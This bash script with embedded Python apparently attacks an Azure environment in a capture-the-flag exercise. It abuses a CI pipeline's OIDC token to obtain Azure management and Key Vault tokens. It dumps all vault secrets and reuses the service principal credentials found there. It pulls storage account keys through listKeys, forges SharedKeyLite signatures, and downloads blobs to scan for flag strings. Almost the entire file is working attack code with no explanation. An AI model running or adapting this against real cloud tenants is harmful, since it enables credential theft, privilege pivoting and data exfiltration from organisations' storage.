#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, re, urllib.request, urllib.parse

def http(url, data=None, headers=None, method=None, raw=False):
    h=dict(headers or {}); body=None
    if isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    elif data == b"": body=b""; h.setdefault("Content-Length","0")
    req=urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=40) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()

def jget(b):
    try: return json.loads(b)
    except Exception: return {}

TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]; SUB=os.environ["AZURE_SUBSCRIPTION_ID"]
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
def tok_oidc(sc):
    st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,"scope":sc,
      "grant_type":"client_credentials","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
      "client_assertion":IDT}); return jget(b).get("access_token")
def tok_sp(ten,cid,sec,sc):
    st,b=http(f"https://login.microsoftonline.com/{ten}/oauth2/v2.0/token",{"client_id":cid,"client_secret":sec,
      "scope":sc,"grant_type":"client_credentials"}); return jget(b).get("access_token")

ARM=tok_oidc("https://management.azure.com/.default")
KVT=tok_oidc("https://vault.azure.net/.default")
FLAG=re.compile(rb"(DF26\{[^}]{0,200}\}|flag\{[^}]{0,200}\}|FLAG\{[^}]{0,200}\}|CTF\{[^}]{0,200}\})", re.I)

# gather principals
creds=[]
st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
for s in jget(b).get("value",[]):
    n=s["id"].rsplit("/",1)[-1]
    st2,b2=http(s["id"]+"?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
    try: creds.append((n, json.loads(jget(b2).get("value",""))))
    except Exception: pass
print("principals:", [c[0] for c in creds])

ACCTS=["sttblcilogsprodx3euoz","sttblbackupprodx3euoz","sttblappcfgprodx3euoz","sttblarchiveprodx3euoz"]
RG="rg-tbl-platform-prod-sea"

def try_storage(tag, armtok):
    print(f"\n### storage via {tag}")
    for acct in ACCTS:
        u=(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/"
           f"Microsoft.Storage/storageAccounts/{acct}/listKeys?api-version=2023-01-01")
        st,b=http(u, data=b"", headers={"Authorization":"Bearer "+armtok}, method="POST")
        if st!=200:
            print(f"  {acct}: listKeys {st}"); continue
        key=jget(b)["keys"][0]["value"]
        print(f"  {acct}: listKeys OK")
        import hmac,hashlib,base64,datetime
        def sas(res, params):
            # use shared key auth
            return None
        # list containers with shared key
        import subprocess
        # simpler: use account key via REST with SharedKeyLite
        def skl(method, path, qs=""):
            now=datetime.datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
            canon=f"/{acct}{path}"
            if qs: canon += "\n"+qs.replace("&","\n").replace("=",":")
            s=f"{method}\n\n\n{now}\nx-ms-version:2021-08-06\n{canon}"
            sig=base64.b64encode(hmac.new(base64.b64decode(key), s.encode("utf-8"), hashlib.sha256).digest()).decode()
            return {"Authorization":f"SharedKeyLite {acct}:{sig}","x-ms-date":now,"x-ms-version":"2021-08-06"}
        st,b=http(f"https://{acct}.blob.core.windows.net/?comp=list", headers=skl("GET","/","comp:list"))
        if st!=200:
            print(f"     list containers {st} {b[:120]}"); continue
        conts=re.findall(rb"<Name>([^<]+)</Name>", b)
        print("     containers:", [c.decode() for c in conts])
        for c in conts:
            c=c.decode()
            st,b=http(f"https://{acct}.blob.core.windows.net/{c}?restype=container&comp=list",
                      headers=skl("GET",f"/{c}","comp:list\nrestype:container"))
            if st!=200: print(f"       {c}: list {st}"); continue
            blobs=re.findall(rb"<Name>([^<]+)</Name>", b)
            print(f"       {c}: {len(blobs)} blobs -> {[x.decode() for x in blobs][:12]}")
            for bl in blobs[:25]:
                bl=bl.decode()
                st,bb=http(f"https://{acct}.blob.core.windows.net/{c}/{urllib.parse.quote(bl)}",
                           headers=skl("GET",f"/{c}/{bl}"))
                if st==200:
                    m=FLAG.search(bb)
                    if m: print(f"         [FLAG] {c}/{bl} -> {m.group(1).decode()}")
        return True
    return False

try_storage("oidc-identity", ARM)
for n,j in creds:
    t=tok_sp(j.get("tenantId",TEN), j["appId"], j["clientSecret"], "https://management.azure.com/.default")
    if not t: print(f"\n### {n}: no ARM token"); continue
    try_storage(n, t)
PYEOF
echo "=== done ==="